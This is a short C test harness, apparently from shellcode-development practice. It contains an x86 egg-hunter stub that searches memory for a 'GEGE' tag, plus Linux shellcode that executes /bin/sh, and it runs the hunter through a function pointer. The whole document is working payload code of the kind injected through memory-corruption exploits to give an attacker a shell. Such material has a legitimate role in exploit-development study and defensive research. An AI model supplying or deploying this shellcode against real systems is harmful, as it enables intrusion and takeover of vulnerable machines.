#include<stdio.h>
#include<string.h>

unsigned char egg[] = \
"\xbe\x47\x45\x47\x45\x43\x39\x33\x75\xfb\x53\xc3";

unsigned char code[] = \
"\x47\x45\x47\x45"
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\xb0\x0b\xcd\x80";

main()
{

  printf("Shellcode size:  %d\n", strlen(code));
  printf("Egg size:  %d\n", strlen(egg));

        int (*ret)() = (int(*)())egg;

        ret();

}